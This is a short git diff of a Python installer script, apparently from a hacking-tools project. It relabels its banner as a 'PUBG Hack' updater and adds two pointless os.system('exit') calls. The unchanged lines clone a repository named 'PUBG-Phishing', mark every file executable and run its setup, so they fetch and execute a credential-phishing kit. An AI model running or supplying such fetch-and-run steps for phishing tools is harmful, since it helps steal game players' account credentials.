@@ -21,9 +21,9 @@ def slowprint(s):
 
 print (''' \033[95m
 +--------------------------------------+
-| This Tool Install All Basic Packages |
+| This Tool Update PUBG Hack Packages  |
 +--------------------------------------+
-| Coded By Online Hacking | version 2.0|
+|       Coded By Online Hacking        |
 +--------------------------------------+''')
 
 slowprint(''' \033[93m
@@ -44,11 +44,8 @@ os.system ("git clone https://github.com/OnlineHacKing/PUBG-Phishing.git")
 os.system ("cd PUBG-Phishing")
 os.system ("chmod +x *")
 os.system ("./setup")
-
-
-print ("wait for second and start hacking")
-
-os.system ("apt install wget -y")
+os.system ("exit")
+os.system ("exit")
 
 
 
